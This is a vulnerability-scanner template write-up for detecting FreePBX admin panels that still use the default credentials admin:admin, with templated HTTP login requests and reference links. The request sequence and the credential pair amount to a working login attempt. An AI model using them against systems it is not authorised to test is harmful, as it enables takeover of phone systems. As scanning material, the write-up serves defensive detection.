# Nuclei Template: FreePBX - Default Admin Credentials
**Template ID:** freepbx-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`freepbx-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected FreePBX administration panel was using default admin credentials (admin:admin). An attacker could gain full administrative access to the PBX system, manage extensions, trunks, and call routing.

## Steps to reproduce / Exploit Payload
```http
GET /admin/config.php HTTP/1.1
Host: {{Hostname}}

POST /admin/config.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: {{session}}

username={{username}}&password={{password}}
```

## References
- https://www.freepbx.org/
- https://community.freepbx.org/t/freepbx-default-admin-passwords/9221
